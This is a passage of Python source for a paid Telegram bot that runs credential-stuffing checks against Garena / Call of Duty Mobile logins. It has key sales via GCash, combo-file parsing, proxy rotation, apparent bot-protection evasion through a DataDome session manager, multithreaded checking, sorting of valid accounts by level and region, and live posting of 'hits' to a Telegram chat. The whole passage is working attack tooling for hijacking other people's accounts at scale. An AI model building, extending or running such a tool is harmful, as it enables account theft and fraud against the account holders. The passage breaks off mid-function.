BTN_DEMO      = "🎮 Try Demo"

# Admin button texts
BTN_ADM_KEYS      = "Keys"
BTN_ADM_USERS     = "Users"
BTN_ADM_PROXY     = "Proxy"
BTN_ADM_SETTINGS  = "Settings"
BTN_ADM_FILES     = "Files"
BTN_ADM_STATS     = "Statistics"
BTN_ADM_LOCK      = "Lock Bot"
BTN_ADM_UNLOCK    = "Unlock Bot"
BTN_ADM_REFRESH   = "Refresh"
BTN_ADM_RUNNING   = "Running Sessions"
BTN_ADM_BACK      = "Admin Back"

BTN_ADM_GEN_HOURS  = "Generate Hours Key"
BTN_ADM_GEN_DAYS   = "Generate Days Key"
BTN_ADM_GEN_MONTHS = "Generate Months Key"
BTN_ADM_GEN_LIFE   = "Generate Lifetime Key"
BTN_ADM_RM_ALL_K   = "Remove All Keys"
BTN_ADM_RM_VIP_K   = "Remove VIP Keys"
BTN_ADM_RM_NVIP_K  = "Remove Non-VIP Keys"

BTN_ADM_ADDVIP    = "Add VIP"
BTN_ADM_RMVIP     = "Remove VIP"
BTN_ADM_BAN       = "Ban User"
BTN_ADM_UNBAN     = "Unban User"
BTN_ADM_ALLUSERS  = "All Users"
BTN_ADM_BROADCAST = "Broadcast Message"

BTN_ADM_UPL_PROXY  = "Upload Proxy File"
BTN_ADM_PROXY_STAT = "Proxy Status"
BTN_ADM_RM_PROXY   = "Remove Proxy Files"
BTN_ADM_PASTE_PRX  = "Paste Proxies"
BTN_ADM_RELOAD_PRX = "Reload Proxy"

BTN_ADM_SET_LIMIT  = "Set Line Limit"
BTN_ADM_SET_VLIMIT = "Set VIP Limit"
BTN_ADM_SET_CD     = "Set Cooldown"
BTN_ADM_SET_THR    = "Set Threads"
BTN_ADM_SET_CONC   = "Set Concurrent"
BTN_ADM_RELOAD_CFG = "Reload Config"

BTN_ADM_CLR_COMBO  = "Clear Combo Files"
BTN_ADM_CLR_RES    = "Clear Result Files"

# Admin Den button texts
BTN_ADM_DEN        = "⚡ Admin Den"
BTN_ADM_ANNOUNCE   = "📢 Announcement"
BTN_ADM_MAINT      = "🔧 Maintenance"
BTN_ADM_TOPUSERS   = "🏆 Top Users"
BTN_ADM_SYSINFO    = "🖥 System Info"
BTN_ADM_MLIMIT     = "📏 Max Lines/Check"
BTN_ADM_USERNOTE   = "📝 User Notes"
BTN_ADM_BATCHKEY   = "🔑 Batch Keys"
BTN_ADM_USERSEARCH = "🔍 Search User"
BTN_ADM_KEYLIST    = "📋 Key List"
BTN_ADM_NOTIFHIT   = "🔔 Hit Notifications"

# ─── ReplyKeyboard builders ───────────────────────────────────────────────────
def rkb(*rows, one_time=False, resize=True):
    """Build a ReplyKeyboardMarkup from row-lists of button label strings."""
    keyboard = [[KeyboardButton(t) for t in row] for row in rows]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=resize, one_time_keyboard=one_time)

def kb_main_user():
    return rkb(
        [BTN_CHECK],
        [BTN_STATUS, BTN_STOP],
        [BTN_RESULTS, BTN_DELETE],
        [BTN_HITS_ON, BTN_HITS_OFF],
        [BTN_BUY, BTN_DEMO],
    )

def kb_main_admin():
    return rkb(
        [BTN_CHECK],
        [BTN_STATUS, BTN_STOP],
        [BTN_RESULTS, BTN_DELETE],
        [BTN_ADMIN],
        [BTN_HITS_ON, BTN_HITS_OFF],
        [BTN_BUY],
    )

def kb_no_key():
    """Keyboard for users who have no key yet — Buy or Demo."""
    return rkb(
        [BTN_BUY],
        [BTN_DEMO],
    )

def kb_gcash_plans():
    """InlineKeyboard showing GCash plans."""
    rows = []
    for pk, pd in GCASH_PLANS.items():
        rows.append([InlineKeyboardButton(
            f"{'💎' if pk=='plan_life' else '🔑'} {pd['label']} — {pd['price']}",
            callback_data=f"gcash_sel:{pk}")])
    return InlineKeyboardMarkup(rows)

def kb_gcash_admin(buyer_uid, plan_key):
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("✅ APPROVE", callback_data=f"gcash_approve:{buyer_uid}:{plan_key}"),
        InlineKeyboardButton("❌ DENY",    callback_data=f"gcash_deny:{buyer_uid}:{plan_key}"),
    ]])

def kb_settings(uid):
    with sessions_lock: s = active_sessions.get(uid, {})
    lk = s.get("lvl_key", "lvl_all"); ck = s.get("cf_key", "cf_both")
    ll = LEVEL_OPTIONS[lk]["label"]; cl = CLEAN_OPTIONS[ck]["label"]
    return rkb(
        [BTN_START_NOW],
        [BTN_LVL_MENU],
        [BTN_CF_MENU],
        [BTN_CANCEL],
    )

def kb_level():
    return rkb(
        [BTN_LVL_ALL],
        [BTN_LVL_100, BTN_LVL_200],
        [BTN_LVL_300, BTN_LVL_400],
        [BTN_BACK],
    )

def kb_filter():
    return rkb(
        [BTN_CF_BOTH],
        [BTN_CF_CLEAN, BTN_CF_DIRTY],
        [BTN_BACK],
    )

def kb_stop_prompt():
    return rkb(
        [BTN_CONTINUE],
        [BTN_STOP_GET],
    )

def kb_join_channel(ch):
    """Channel gate still uses InlineKeyboard (URL button needs inline)."""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Join Channel", url=f"https://t.me/{ch}")],
        [InlineKeyboardButton("I Joined — Verify Now", callback_data="check_join")],
    ])

def kb_admin_main(cfg):
    locked = cfg.get("locked", False)
    return rkb(
        [BTN_ADM_KEYS, BTN_ADM_USERS],
        [BTN_ADM_PROXY, BTN_ADM_SETTINGS],
        [BTN_ADM_FILES, BTN_ADM_STATS],
        [BTN_ADM_UNLOCK if locked else BTN_ADM_LOCK, BTN_ADM_REFRESH],
        [BTN_ADM_RUNNING],
        [BTN_ADM_DEN],
        [BTN_ADM_BACK],
    )

def kb_admin_den():
    return rkb(
        [BTN_ADM_ANNOUNCE, BTN_ADM_MAINT],
        [BTN_ADM_TOPUSERS, BTN_ADM_SYSINFO],
        [BTN_ADM_MLIMIT, BTN_ADM_NOTIFHIT],
        [BTN_ADM_USERSEARCH, BTN_ADM_KEYLIST],
        [BTN_ADM_BATCHKEY, BTN_ADM_USERNOTE],
        [BTN_ADM_BACK],
    )

def kb_admin_keys():
    return rkb(
        [BTN_ADM_GEN_HOURS, BTN_ADM_GEN_DAYS],
        [BTN_ADM_GEN_MONTHS, BTN_ADM_GEN_LIFE],
        [BTN_ADM_RM_ALL_K],
        [BTN_ADM_RM_VIP_K, BTN_ADM_RM_NVIP_K],
        [BTN_ADM_BACK],
    )

def kb_admin_users():
    return rkb(
        [BTN_ADM_ADDVIP, BTN_ADM_RMVIP],
        [BTN_ADM_BAN, BTN_ADM_UNBAN],
        [BTN_ADM_ALLUSERS, BTN_ADM_RUNNING],
        [BTN_ADM_BROADCAST],
        [BTN_ADM_BACK],
    )

def kb_admin_proxy():
    return rkb(
        [BTN_ADM_UPL_PROXY, BTN_ADM_PROXY_STAT],
        [BTN_ADM_RM_PROXY, BTN_ADM_PASTE_PRX],
        [BTN_ADM_RELOAD_PRX],
        [BTN_ADM_BACK],
    )

def kb_admin_settings(cfg):
    locked = cfg.get("locked", False)
    return rkb(
        [BTN_ADM_UNLOCK if locked else BTN_ADM_LOCK],
        [BTN_ADM_SET_LIMIT, BTN_ADM_SET_VLIMIT],
        [BTN_ADM_MLIMIT, BTN_ADM_SET_THR],
        [BTN_ADM_SET_CD, BTN_ADM_SET_CONC],
        [BTN_ADM_RELOAD_CFG],
        [BTN_ADM_BACK],
    )

def kb_admin_files():
    return rkb(
        [BTN_ADM_CLR_COMBO, BTN_ADM_CLR_RES],
        [BTN_ADM_BACK],
    )

def kb_delete_confirm():
    return rkb([BTN_CANCEL])

# ─── Route helper: resolve ReplyKeyboard button text to old callback_data ────
LEVEL_BTN_MAP = {
    BTN_LVL_ALL: "lvl_all",
    BTN_LVL_100: "lvl_100",
    BTN_LVL_200: "lvl_200",
    BTN_LVL_300: "lvl_300",
    BTN_LVL_400: "lvl_400",
}
CF_BTN_MAP = {
    BTN_CF_BOTH:  "cf_both",
    BTN_CF_CLEAN: "cf_clean",
    BTN_CF_DIRTY: "cf_notclean",
}


# ════════════════════════════════════════════
#  STATS CARD
# ════════════════════════════════════════════
def _fmt_eta(done, total, start_ts=None):
    """Return ETA string if we have enough data, else empty."""
    if not start_ts or not done or not total or done >= total:
        return ""
    elapsed = time.time() - start_ts
    if elapsed < 5: return ""
    rate = done / elapsed  # accounts per second
    remaining = total - done
    eta_secs = remaining / rate
    if eta_secs < 60: return f"~{int(eta_secs)}s"
    if eta_secs < 3600: return f"~{int(eta_secs//60)}m {int(eta_secs%60)}s"
    return f"~{int(eta_secs//3600)}h {int((eta_secs%3600)//60)}m"

def _fmt_speed(done, start_ts=None):
    """Return speed string (accounts/min)."""
    if not start_ts or not done: return ""
    elapsed = time.time() - start_ts
    if elapsed < 5: return ""
    rate = done / elapsed * 60  # per minute
    if rate >= 1000: return f"{rate/1000:.1f}k/min"
    return f"{int(rate)}/min"

def stats_card(done,total,stats,ll="",cl="",result_folder=None,start_ts=None):
    pct      = int(done / total * 100) if total else 0
    valid    = stats.get('valid', 0)
    invalid  = stats.get('invalid', 0)
    has_codm = stats.get('has_codm', 0)
    no_codm  = stats.get('no_codm', 0)
    clean    = stats.get('clean', 0)
    not_clean= stats.get('not_clean', 0)
    hit_rate = f"{has_codm/valid*100:.2f}%" if valid > 0 else "—"
    acc_rate = f"{valid/(valid+invalid)*100:.1f}%" if (valid+invalid) > 0 else "—"
    speed_s  = _fmt_speed(done, start_ts)
    eta_s    = _fmt_eta(done, total, start_ts)

    # ── Dynamic progress bar ──────────────────────────────────────────────
    bar = _progress_bar(pct, 15)
    hit_badge = _hit_badge(has_codm)
    speed_fmt = _speed_color(speed_s) if speed_s else "⏳ Warming up…"

    # ── ETA display ───────────────────────────────────────────────────────
    eta_display = f"⏱ <code>{eta_s}</code>" if eta_s and eta_s != "—" else "⏱ Calculating…"

    # ── Phase label based on progress ────────────────────────────────────
    if pct == 0:     phase = "🔁 INITIALIZING"
    elif pct < 25:   phase = "⚡ JUST STARTED"
    elif pct < 50:   phase = "🔥 IN PROGRESS"
    elif pct < 75:   phase = "💥 PAST HALFWAY"
    elif pct < 100:  phase = "🏁 ALMOST DONE!"
    else:            phase = "✅ COMPLETE"

    # ── Remaining lines ───────────────────────────────────────────────────
    remaining = max(0, total - done) if total else 0

    base = (
        f"{pe(1)} <b>╔══ CODM CHECKER ══╗</b> {pe(1)}\n"
        f"{pe_sep()}\n"
        f"<b>{phase}</b>\n"
        f"{pe_sep()}\n"
        f"📊 <b>PROGRESS</b>\n"
        f"<code>{bar}</code>  <b>{pct}%</b>\n"
        f"✅ Done     : <code>{done:,}</code> / <code>{total:,}</code>\n"
        f"⏳ Remaining: <code>{remaining:,}</code> lines\n"
        f"{pe_thin()}\n"
        f"🚀 Speed    : {speed_fmt}\n"
        f"🕐 ETA      : {eta_display}\n"
        f"{pe_sep()}\n"
        f"🎯 <b>RESULTS</b>\n"
        f"✅ Valid     : <code>{valid:,}</code>  ❌ Invalid: <code>{invalid:,}</code>\n"
        f"🧼 Clean     : <code>{clean:,}</code>  🚫 Not Clean: <code>{not_clean:,}</code>\n"
        f"{pe_thin()}\n"
        f"{pe(1)} <b>CODM HITS  : <code>{has_codm:,}</code></b> {pe(1)}\n"
        f"   {hit_badge}\n"
        f"📉 No CODM  : <code>{no_codm:,}</code>\n"
        f"{pe_thin()}\n"
        f"💯 Hit Rate  : <code>{hit_rate}</code>   🎯 Acc: <code>{acc_rate}</code>\n"
        f"{pe_sep()}\n"
    )

    if ll or cl:
        base += (
            f"⚙️ <b>CONFIG</b>\n"
            f"   🎚 Level  : <b>{ll}</b>   🔍 Filter: <b>{cl}</b>\n"
            f"{pe_sep()}\n"
        )

    # ── Level range + country breakdown from result folder ─────────────
    extra = ""
    if result_folder:
        try:
            lvl, ctr, hits = parse_result_stats(result_folder)
            live_codm = stats.get("has_codm", 0)
            if live_codm > 0 and hits > 0 and hits != live_codm:
                scale = live_codm / hits
                lvl = {k: max(1, round(v*scale)) for k, v in lvl.items()}
                ctr = {k: max(1, round(v*scale)) for k, v in ctr.items()}
                hits = live_codm
            elif live_codm > 0 and hits == 0:
                hits = live_codm
            if hits > 0:
                lvl_lines = f"{pe(1)} <b>🎖 LEVEL BREAKDOWN</b>\n"
                for rng, cnt in lvl.items():
                    pct2 = cnt / hits * 100
                    bw   = int(pct2 / 10)
                    bar2 = "█" * bw + "░" * (10 - bw)
                    lvl_lines += f"  Lv{rng:<6}: <code>[{bar2}]</code> {cnt} ({pct2:.0f}%)\n"
                ctr_lines = f"{pe(1)} <b>🌏 SERVER BREAKDOWN</b>\n"
                for country, cnt in list(ctr.items())[:8]:
                    pct3 = cnt / hits * 100
                    bw3  = int(pct3 / 10)
                    bar3 = "█" * bw3 + "░" * (10 - bw3)
                    ctr_lines += f"  {country:<8}: <code>[{bar3}]</code> {cnt} ({pct3:.0f}%)\n"
                extra = (
                    f"{lvl_lines}"
                    f"{pe_thin()}\n"
                    f"{ctr_lines}"
                    f"{pe_sep()}\n"
                )
        except: pass

    footer = f"📡 /check — refresh  ·  🛑 /stop — stop  ·  ❌ /cancel — cancel"
    return base + extra + footer

# ════════════════════════════════════════════
#  ZIP + CLEANUP
# ════════════════════════════════════════════
TG_MAX_BYTES = 49 * 1024 * 1024   # 49 MB — just under Telegram 50 MB limit

def zip_results(folder, out):
    """Zip result files. Returns list of Path(s) — split into parts if > 49 MB."""
    files = sorted([f for f in folder.rglob("*") if f.is_file() and f != out and not f.name.endswith(".zip")])
    if not files: return []
    # Try single zip first
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as zf:
        for f in files: zf.write(f, f.relative_to(folder))
    if out.stat().st_size <= TG_MAX_BYTES:
        return [out]
    # Too big — split into parts by file
    out.unlink()
    parts=[]; part_num=1; cur_files=[]; cur_size=0
    for f in files:
        fsize = f.stat().st_size
        if cur_files and cur_size + fsize > TG_MAX_BYTES:
            pout = out.parent / f"{out.stem}_part{part_num}{out.suffix}"
            with zipfile.ZipFile(pout, "w", zipfile.ZIP_DEFLATED) as zf:
                for cf in cur_files: zf.write(cf, cf.relative_to(folder))
            parts.append(pout); part_num += 1; cur_files = []; cur_size = 0
        cur_files.append(f); cur_size += fsize
    if cur_files:
        pout = out.parent / f"{out.stem}_part{part_num}{out.suffix}"
        with zipfile.ZipFile(pout, "w", zipfile.ZIP_DEFLATED) as zf:
            for cf in cur_files: zf.write(cf, cf.relative_to(folder))
        parts.append(pout)
    return parts

# ════════════════════════════════════════════
#  RESULT FOLDER STATS PARSER
# ════════════════════════════════════════════
def parse_result_stats(result_folder):
    """Read dec_tyrantv12 result folder structure.
    Returns level_counts, country_counts, total_hits.
    Deduplicates accounts so counts match LiveStats has_codm exactly.
    """
    from collections import defaultdict
    folder=Path(result_folder)
    if not folder.exists(): return {},{},0
    level_counts=defaultdict(int); country_counts=defaultdict(int); total=0
    LEVEL_ORDER=["1-50","51-100","101-150","151-200","201-250","251-300","301-350","351+"]
    seen_accounts: set = set()   # global dedup so no account counted twice
    for status_dir in folder.iterdir():
        if not status_dir.is_dir() or status_dir.name not in ("Clean","NotClean"): continue
        for country_dir in status_dir.iterdir():
            if not country_dir.is_dir(): continue
            country=country_dir.name
            for txt in country_dir.glob("*_accounts.txt"):
                lr=txt.stem.replace("_accounts","")
                try:
                    unique_n=0
                    for line in txt.read_text(encoding="utf-8",errors="ignore").splitlines():
                        line=line.strip()
                        if line and line not in seen_accounts:
                            seen_accounts.add(line); unique_n+=1
                    if unique_n>0:
                        level_counts[lr]+=unique_n
                        country_counts[country]+=unique_n
                        total+=unique_n
                except: pass
    sorted_lvl={k:level_counts[k] for k in LEVEL_ORDER if k in level_counts}
    sorted_ctr=dict(sorted(country_counts.items(),key=lambda x:-x[1]))
    return sorted_lvl,sorted_ctr,total

def get_folder_stats(result_folder) -> dict:
    """Return {valid,invalid,clean,not_clean,has_codm,no_codm,total} counted from
    the Clean/ and NotClean/ subfolders inside result_folder.
    Used to reconstruct pre-crash hit counts for auto-resume."""
    folder=Path(result_folder)
    if not folder.exists(): return {}
    clean=not_clean=0
    for status_dir in folder.iterdir():
        if not status_dir.is_dir(): continue
        if status_dir.name=="Clean":
            for txt in status_dir.rglob("*_accounts.txt"):
                try: clean+=sum(1 for l in txt.read_text(encoding="utf-8",errors="ignore").splitlines() if l.strip())
                except: pass
        elif status_dir.name=="NotClean":
            for txt in status_dir.rglob("*_accounts.txt"):
                try: not_clean+=sum(1 for l in txt.read_text(encoding="utf-8",errors="ignore").splitlines() if l.strip())
                except: pass
    has_codm=clean+not_clean
    if has_codm==0: return {}
    # total=0 means "processed count unknown from files alone" — do not use for progress bar
    return {"valid":has_codm,"invalid":0,"clean":clean,"not_clean":not_clean,
            "has_codm":has_codm,"no_codm":0,"total":0}

def update_persisted_stats(uid: str, stats: dict):
    """Patch live_stats_snapshot into an existing persisted session without
    overwriting all other fields (safe to call from background threads)."""
    try:
        ps=load_persisted_sessions()
        if uid in ps:
            ps[uid]["live_stats_snapshot"]=stats
            with open(SESSIONS_FILE,"w",encoding="utf-8") as f: json.dump(ps,f,indent=2)
    except: pass

def merge_stats(base: dict, extra: dict) -> dict:
    """Add every numeric field in extra into base; returns new dict."""
    result=dict(base)
    for k in ("valid","invalid","clean","not_clean","has_codm","no_codm","total"):
        result[k]=result.get(k,0)+extra.get(k,0)
    return result

# ════════════════════════════════════════════
#  CHECKER RUNNER
# ════════════════════════════════════════════
def run_checker(uid,combo_file,result_folder,limit,threads,stop_event,
                bot_token,chat_id,thresholds,clean_filter,progress_cb=None,is_resume=False):
    if not CHECKER_OK: return {"error":f"Checker unavailable: {CHECKER_ERR}"}

    # ── Checkpoint file: tracks which line indices were already processed ─
    # Stored next to the combo file as <combo>.ckpt
    # Format: one integer per line (0-based index into the full accounts list)
    # On crash-resume, these indices are skipped so no account is checked twice.
    _ckpt_file = Path(str(combo_file) + ".ckpt")
    # If this is NOT a crash-resume, always delete stale checkpoint so a fresh
    # run doesn't skip all accounts (the #1 cause of "Processed: 0" bugs).
    if not is_resume:
        try:
            if _ckpt_file.exists(): _ckpt_file.unlink()
        except: pass
    _ckpt_lock = threading.Lock()
    _ckpt_buf  = []              # batch buffer — flushed every N completions
    _CKPT_FLUSH = 20             # flush checkpoint every 20 accounts

    def _load_checkpoint():
        if not _ckpt_file.exists(): return set()
        try:
            with open(_ckpt_file,"r",encoding="utf-8") as _cf:
                return {int(l.strip()) for l in _cf if l.strip().isdigit()}
        except: return set()

    def _flush_checkpoint():
        if not _ckpt_buf: return
        try:
            with open(_ckpt_file,"a",encoding="utf-8") as _cf:
                _cf.write("\n".join(str(i) for i in _ckpt_buf)+"\n")
            _ckpt_buf.clear()
        except: pass

    def _mark_done(idx):
        with _ckpt_lock:
            _ckpt_buf.append(idx)
            if len(_ckpt_buf) >= _CKPT_FLUSH:
                _flush_checkpoint()

    # ── Parse accounts ────────────────────────────────────────────────────
    accounts=[]
    for enc in ("utf-8","latin-1","cp1252","iso-8859-1"):
        try:
            with open(combo_file,"r",encoding=enc) as f:
                accounts=[ln.strip() for ln in f if ln.strip() and not ln.strip().startswith("===")]
            break
        except UnicodeDecodeError: continue
    if not accounts:
        try:
            with open(combo_file,"r",encoding="utf-8",errors="ignore") as f:
                accounts=[ln.strip() for ln in f if ln.strip() and not ln.strip().startswith("===")]
        except: pass
    if not accounts: return {"error":"No valid accounts found."}
    if limit and limit>0: accounts=accounts[:limit]

    # ── Skip already-checked indices from checkpoint ──────────────────────
    _already_done = _load_checkpoint()
    if _already_done:
        log.info(f"[{uid}] Checkpoint: skipping {len(_already_done):,} already-checked lines")
    # Keep original index so checkpoint entries match across restarts
    _all_items = [(i, line) for i, line in enumerate(accounts) if i not in _already_done]
    # total = full list length (correct denominator for progress bar)
    total=len(accounts); result_folder.mkdir(parents=True,exist_ok=True)

    # ── Guard: if nothing left to process, return early ──────────────────
    if not _all_items:
        if is_resume and _already_done:
            # All lines were already checkpointed — bot completed the session
            # before cleanup ran (e.g. crash between checker finish and del_combo).
            # Silently clean up the stale checkpoint and return zero stats so the
            # caller's finally block handles the normal cleanup flow.
            log.info(f"[{uid}] Resume: all {total:,} lines already in checkpoint "
                     f"— stale session, nothing left to process. Cleaning up.")
            try: _ckpt_file.unlink()
            except: pass
        elif not is_resume and _already_done:
            # Checkpoint deletion failed silently earlier — force-clear now and
            # signal the caller to retry (caller sees error key and can re-run).
            log.warning(f"[{uid}] Fresh run: stale checkpoint blocked all {total:,} lines! "
                        f"Cleared checkpoint — please start again.")
            try: _ckpt_file.unlink()
            except: pass
            return {"error": "Stale checkpoint cleared. Please start the check again — it will now run normally."}
        else:
            log.warning(f"[{uid}] _all_items empty for unknown reason (accounts={total}, done={len(_already_done)})")
        return ls.get_stats()


    import queue as _queue_mod
    import dec_tyrantv12 as _dty
    import logging as _logging

    # Each user gets their own fixed thread count — fully independent.
    MAX_WORKER_THREADS = threads

    cm=CookieManager(); ls=LiveStats(); fl=threading.Lock(); tl=threading.local(); il=threading.Lock()
    with sessions_lock:
        if uid in active_sessions:
            active_sessions[uid]["live_stats"]=ls

    # ── Per-uid non-blocking hit sender ──────────────────────────────────
    _HIT_QUEUES: dict = getattr(_dty, "_HIT_QUEUES", {})
    if not hasattr(_dty, "_HIT_QUEUES"):
        _dty._HIT_QUEUES = _HIT_QUEUES
        _orig_send_global = _dty.send_telegram_message
        def _registry_send(token, cid_arg, message, parse_mode='HTML'):
            # ── Wrap hit messages with premium emoji header/footer ─────────
            _msg = (
                f"{pe(3)} <b>🎯 LIVE HIT DETECTED!</b> {pe(3)}\n"
                f"{pe_sep()}\n"
                f"{message}\n"
                f"{pe_sep()}\n"
                f"{pe(2)} Another one bites the dust! {pe(2)}"
            )
            q = _dty._HIT_QUEUES.get((token, str(cid_arg)))
            if q is not None:
                q.put(_msg); return None
            return _orig_send_global(token, cid_arg, _msg, parse_mode)
        _dty.send_telegram_message = _registry_send

    _hit_queue = _queue_mod.Queue()
    _registry_key = (bot_token, str(chat_id))
    _dty._HIT_QUEUES[_registry_key] = _hit_queue

    def _hit_sender():
        """Send hits live. Retries once on network failure. Drains queue before exit."""
        import requests as _req
        while True:
            msg = _hit_queue.get()
            if msg is None:
                # Drain any remaining items before truly stopping
                remaining = []
                while not _hit_queue.empty():
                    try:
                        item = _hit_queue.get_nowait()
                        if item is not None: remaining.append(item)
                    except: break
                for rem_msg in remaining:
                    for _attempt in range(3):  # retry up to 3x
                        try:
                            r = _req.post(
                                f"https://api.telegram.org/bot{bot_token}/sendMessage",
                                data={"chat_id":chat_id,"text":rem_msg,"parse_mode":"HTML"},
                                timeout=15)
                            if r.status_code==200: break
                        except: pass
                        time.sleep(1)
                break
            # Normal hit — send with retry
            for _attempt in range(3):
                try:
                    r = _req.post(
                        f"https://api.telegram.org/bot{bot_token}/sendMessage",
                        data={"chat_id":chat_id,"text":msg,"parse_mode":"HTML"},
                        timeout=15)
                    if r.status_code==200: break
                    if r.status_code==429:  # rate limited
                        retry_after=r.json().get("parameters",{}).get("retry_after",5)
                        time.sleep(min(retry_after,10))
                except: pass
                time.sleep(1)

    threading.Thread(target=_hit_sender,daemon=True,name=f"hitsend-{uid}").start()

    tg_cfg=(bot_token,str(chat_id),thresholds,"",clean_filter)

    # ── Suppress dec_tyrantv12 output WITHOUT touching sys.stdout globally ─
    # We disable the module-level logger and rich Console for the duration of
    # each processaccount call using a thread-local flag + NullHandler approach.
    _null_handler = _logging.NullHandler()
    _dty_logger   = _logging.getLogger()   # dec_tyrantv12 uses root logger

    class _SilentConsole:
        """Drop-in that swallows all rich Console.print calls."""
        def print(self, *a, **kw): pass
        def __getattr__(self, name): return lambda *a,**kw: None

    _real_console = getattr(_dty, "console", None)

    # Track per-thread call count so we can recycle sessions every N calls
    # and free the underlying connection pool — crucial on 512 MB Railway.
    _SESSION_RECYCLE = 50   # recycle session every 50 accounts per thread

    def gsess():
        count = getattr(tl, 'call_count', 0)
        if not hasattr(tl,"session") or count >= _SESSION_RECYCLE:
            # Close existing session to free socket/SSL resources
            if hasattr(tl,"session"):
                try: tl.session.close()
                except: pass
            with il: time.sleep(0.3)
            dm=DataDomeManager(); tl.session=create_thread_session(cm,dm); tl.dm=dm
            tl.call_count = 0
        else:
            tl.call_count = count + 1
        tl.session.proxies.update(geo_rotator.get_proxies())
        return tl.session,tl.dm

    # Per-account: parse flexible format then call processaccount
    def _parse_line(line):
        """
        Supported formats — all return (user, password):
          user:pass
          user:pass:anything
          https://sso.garena.com/ui/register:user:pass
          https://sso.garena.com/universal/login:user:pass
        """
        import urllib.parse as _up
        _SCHEMES = ("http://","https://","socks5://","socks4://","ftp://")

        line = line.strip()
        if not line: return None

        # ── Case A: line STARTS with a URL scheme ─────────────────────
        ll = line.lower()
        if any(ll.startswith(s) for s in _SCHEMES):
            # Sub-case A1: RFC URL with embedded creds (user:pass@host)
            try:
                p = _up.urlparse(line)
                # Skip if urlparse returned an IP address as the username —
                # that means it found user@host in proxy format and misread it
                _ip_re = __import__("re").compile(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
                if p.username and p.password and not _ip_re.match(p.username):
                    return _up.unquote(p.username), _up.unquote(p.password)
            except: pass
            # Sub-case A2: scheme://host:port:user:pass
            after = line.split("://", 1)[1]
            segs = after.split(":")
            start = 0
            for i2, seg in enumerate(segs):
                s = seg.strip().split("/")[0]
                if s.isdigit():                                    # port
                    start = i2 + 1; continue
                dots = s.split(".")
                if len(dots) == 4 and all(d.isdigit() for d in dots):  # IPv4
                    start = i2 + 1; continue
                if "@" not in s and "." in s and i2 == 0:          # hostname (first seg only)
                    start = i2 + 1; continue
                break
            creds = [s.strip() for s in segs[start:] if s.strip()]
            if len(creds) >= 2:
                return creds[0], creds[1]
            return None

        # ── Case B: plain combo user:pass[:extra_or_url] ──────────────
        colon = line.find(":")
        if colon < 0: return None
        user = line[:colon].strip()
        rest = line[colon + 1:]

        # Check if a URL scheme appears somewhere in rest
        scheme_pos = -1
        for s in _SCHEMES:
            p = rest.lower().find(s)
            if p >= 0 and (scheme_pos < 0 or p < scheme_pos):
                scheme_pos = p

        if scheme_pos > 0:
            # e.g. rest = "pass:https://extra.com" → scheme_pos = 5
            # everything before scheme_pos, strip trailing ":"
            before = rest[:scheme_pos].rstrip(":")
            pwd = before.split(":")[-1].strip() if ":" in before else before.strip()
        else:
            pwd = rest.split(":")[0].strip()

        if not user or not pwd: return None
        return user, pwd

    # ── Install a NullHandler on the root logger ONCE globally ─────────────
    import logging as _log_mod

    # Global ref-count so concurrent run_checker() calls don't fight over loggers.
    # We silence on first entry and restore on last exit only.
    if not hasattr(run_checker, "_logger_lock"):
        run_checker._logger_lock  = threading.Lock()
        run_checker._logger_count = [0]
        run_checker._logger_state = [None]

    def _silence_all_loggers():
        with run_checker._logger_lock:
            run_checker._logger_count[0] += 1
            if run_checker._logger_count[0] > 1:
                return None   # already silenced by another checker
            saved = {}
            root = _log_mod.getLogger()
            saved['root_handlers'] = root.handlers[:]
            saved['root_level']    = root.level
            root.handlers = []; root.setLevel(_log_mod.CRITICAL + 1)
            saved['loggers'] = {}
            for name, lgr in list(_log_mod.Logger.manager.loggerDict.items()):
                if isinstance(lgr, _log_mod.Logger):
                    saved['loggers'][name] = (lgr.handlers[:], lgr.level, lgr.propagate)
                    lgr.handlers = []; lgr.setLevel(_log_mod.CRITICAL + 1)
                    lgr.propagate = False
            run_checker._logger_state[0] = saved
            return saved

    def _restore_all_loggers(saved):
        with run_checker._logger_lock:
            if run_checker._logger_count[0] > 0:
                run_checker._logger_count[0] -= 1
            if run_checker._logger_count[0] > 0:
                return   # other checkers still running — stay silent
            state = run_checker._logger_state[0]
            if not state:
                return
            root = _log_mod.getLogger()
            root.handlers = state['root_handlers']
            root.setLevel(state['root_level'])
            for name, (handlers, level, propagate) in state.get('loggers', {}).items():
                lgr = _log_mod.Logger.manager.loggerDict.get(name)
                if isinstance(lgr, _log_mod.Logger):
                    lgr.handlers = handlers; lgr.setLevel(level); lgr.propagate = propagate
            run_checker._logger_state[0] = None

    # Replace rich console with a silent one for this checker's lifetime
    if _real_console is not None:
        _dty.console = _SilentConsole()

    # Keep a reference to the real stderr captured NOW (before global redirect)
    _real_stderr = sys.stderr

    # ── Per-file proxy error tracking ────────────────────────────────────
    # Counts "Connection aborted / Remote end closed" errors per proxy file
    # by scanning captured stdout from processaccount.
    _proxy_errors   = {}   # {filename: error_count}
    _proxy_attempts = {}   # {filename: attempt_count}
    _track_lock     = threading.Lock()
    _ERR_KW = (
        b"connection aborted", b"remote end closed", b"proxy dead",
        b"rate-limited", b"connection without response",
        b"error getting datadome", b"connectionerror",
    )

    def _cur_proxy_file():
        try:
            pf=geo_rotator._proxy_files; fi=geo_rotator._file_idx
            if pf: return os.path.basename(pf[fi % len(pf)])
        except: pass
        return ""

    # done counter used by process_one to track progress
    done=[0]
    # Failure tracking: detect when ALL accounts fail silently (e.g. broken session/proxy)
    _fail_count   = [0]
    _first_err    = [None]   # first exception message for diagnostics
    _fail_lock    = threading.Lock()
    # _thread_sink: each worker thread gets its own private StringIO so
    # concurrent users never share or close each other's stream.
    _thread_sink = threading.local()

    def process_one(idx_line):
        if stop_event.is_set(): return
        i,line=idx_line
        if ":" not in line: return
        parsed = _parse_line(line)
        if not parsed: return
        acct, pwd = parsed
        if not acct or not pwd: return
        try:
            sess,dm=gsess()
            # Each thread keeps its own sink — never shared, never closed early.
            if not hasattr(_thread_sink, 'buf') or _thread_sink.buf.closed:
                _thread_sink.buf = io.StringIO()
            _call_buf = _thread_sink.buf
            # Reset for this call — also shrink if grown too large
            _call_buf.seek(0); _call_buf.truncate(0)
            if _call_buf.tell() == 0 and len(_call_buf.getvalue()) > 65536:
                # Buffer grew large last call — replace it entirely to free RAM
